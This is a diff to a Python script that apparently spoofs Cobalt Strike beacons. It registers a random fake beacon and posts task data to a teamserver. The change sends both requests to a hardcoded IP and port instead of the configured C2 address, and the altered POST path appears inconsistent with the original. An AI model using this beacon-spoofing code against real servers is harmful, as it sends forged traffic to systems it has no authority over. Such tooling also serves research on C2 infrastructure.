@@ -24,6 +24,9 @@ CS_FIXED_IV = b"abcdefghijklmnop"
 EMPTY_UA_HEADERS = {"User-Agent":""}
 URL_PATHS = {'x86':'ab2g', 'x64':'ab2h'}
 
+desip="1.1.1.1"
+desport=":8081"
+
 def get_beacon_data(url, arch):
     full_url = urljoin(url, URL_PATHS[arch])
     try:
@@ -72,6 +75,7 @@ def register_beacon(conf):
     Args:
         conf (dict): Beacon configuration dict, from cobaltstrikeConfig parser
     """
+    
     # Register new random beacon
     urljoin('http://'+conf['C2Server'].split(',')[0], conf['C2Server'].split(',')[1])
     aes_source = os.urandom(16)
@@ -81,7 +85,7 @@ def register_beacon(conf):
 
     print('[+] Registering new random beacon: comp=%s user=%s url=%s' % (m.comp, m.user, conf['C2Server']))
     try:
-        req = requests.request('GET', urljoin('http://'+conf['C2Server'].split(',')[0], conf['C2Server'].split(',')[1]), params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
+        req = requests.request('GET', urljoin('http://'+desip+desport, conf['C2Server'].split(',')[1]), params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
     except Exception as e:
         print('[-] Got excpetion from server: %s' % e)
         return
@@ -109,7 +113,7 @@ def register_beacon(conf):
     print('[+] Sending task data')
     
     try:
-        req = requests.request('POST', urljoin('http://'+conf['C2Server'].split(',')[0], conf['HttpPostUri'].split(',')[0]), params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
+        req = requests.request('POST', urljoin('http://'+desip+desport, conf['C2Server'].split(',')[1]), params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
     except Exception as e:
         print('[-] Got excpetion from server while sending task: %s' % e)
 
